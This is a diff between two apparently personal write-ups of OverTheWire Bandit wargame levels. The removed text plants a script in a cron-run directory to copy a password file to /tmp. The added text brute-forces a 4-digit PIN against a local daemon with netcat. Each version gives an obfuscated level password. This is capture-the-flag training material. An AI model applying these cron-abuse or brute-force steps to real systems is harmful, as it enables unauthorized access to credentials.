@@ -1,67 +1,68 @@
-# Write-up: Bandit 23 → 24
-**Date:** 2025-08-15
+# Write-up: Bandit 24 → 25
+**Date:** 2025-08-16
 
 ## Obfuscated password (ROT13) 
-`to8XEEPffuhMKV0gHhE6lcBSwvMos3T8`
+`vPv86ggG4XFAr1nezXvjoDAzO3LWC3d4`
 
 ## OBJECTIVE
-> "A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+> "A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 >
-> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
->
-> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…"
+> You do not need to create new connections each time."
 
 ## PURPOSE
 
-We need to go back once more to `/etc/cron.d` and `cat` **`cronjob_bandit24`** to find the script `/usr/bin/cronjob_bandit24.sh`, which contains the following:
-
+We must brute-force a **4-digit PIN (0000–9999)** over **a single TCP connection** to `localhost:30002`. Each attempt is exactly one line:
 ```
-#!/bin/bash
+<bandit24_password> <4-digit_pin>
+```
+The daemon replies **“Wrong!”** for bad guesses and prints the **bandit25** password for the correct one.  
+We’ll show two solutions that both keep **one connection** open:
 
-myname=$(whoami)
+- a **one-liner** that streams all guesses and filters out the “Wrong!” lines (simple, quick to type);
+- a tiny **script** (clear, reusable, and saves a transcript).
 
-cd /var/spool/$myname/foo
-echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
-for i in * .*;
-do
-    if [ "$i" != "." -a "$i" != ".." ];
-    then
-        echo "Handling $i"
-        owner="$(stat --format "%U" ./$i)"
-        if [ "${owner}" = "bandit23" ]; then
-            timeout -s 9 60 ./$i
-        fi
-        rm -f ./$i
-    fi
-done
+Using **one** connection is faster and matches the level hint; `seq -w` zero-pads the PINs (`0000…9999`) so we don’t miss leading zeros; filtering with `grep -iv '^wrong'` isolates the single success line.
+
+First, load the current level’s password in a variable:
+```bash
+pass=$(cat /etc/bandit_pass/bandit24)
 ```
 
-We can deduce that the script will execute and then delete all scripts **owned by bandit23** in `/var/spool/bandit24/foo`. Here is where we can create our script, then. To confirm, we can run `ls -l /var/spool/bandit24`:
+**One-liner:**
+```bash
+{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
+| nc localhost 30002 | grep -iv '^wrong'
 ```
-drwxrwx-wx 8 root bandit24 4096 Aug 15 23:21 foo
-```
-As we are in the *others* class, we have **write** and **execute** permissions on `foo`, but no **read** permission. All we need to do then is write a script that will copy the next password to a location we *can* read, namely a `/tmp` file, and it will be **executed** by the cron job.
 
-`cat > /var/spool/bandit24/foo/mydrop` will bring us into interactive mode where we can write our script, then press **Ctrl+D** to save:
+**Script (save, run, and keep a transcript):**
+```bash
+#!/usr/bin/env bash
+# /tmp/brute_30002.sh — Bandit 24 → 25 over one connection
+
+PASS="$(</etc/bandit_pass/bandit24)"
+HOST=localhost
+PORT=30002
+OUT=/tmp/b25.out
+
+{
+  for pin in $(seq -w 0000 9999); do
+    echo "$PASS $pin"
+  done
+} | nc "$HOST" "$PORT" | tee "$OUT"
+
+grep -iv '^wrong' "$OUT"
 ```
-#!/bin/bash
-/bin/cat /etc/bandit_pass/bandit24 > /tmp/mybandit24pass
-```
-Now make the script executable (required so cron can run it):
-```
-chmod 755 /var/spool/bandit24/foo/mydrop
-```
-After about a minute (cron runs every minute), read the password:
-```
-cat /tmp/mybandit24pass
-```
+
+> Note: If your `nc` is the GNU flavor and doesn’t close after stdin ends, add `-q 1` to the `nc` command.
 
 ## SOLUTIONS
-- `cat /etc/cron.d/cronjob_bandit24`
-- `cat /usr/bin/cronjob_bandit24.sh`
-- `cat > /var/spool/bandit24/foo/mydrop` *(paste the two lines above, then Ctrl+D)*
-- `chmod 755 /var/spool/bandit24/foo/mydrop`
-- `cat /tmp/mybandit24pass`
+- `pass=$(cat /etc/bandit_pass/bandit24)`
+- **One-liner:**  
+  `{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } | nc localhost 30002 | grep -iv '^wrong'`
+- **Script approach:**  
+  - Create `/tmp/brute_30002.sh` with the script above  
+  - `chmod +x /tmp/brute_30002.sh`  
+  - `bash /tmp/brute_30002.sh`
 
 ---
 
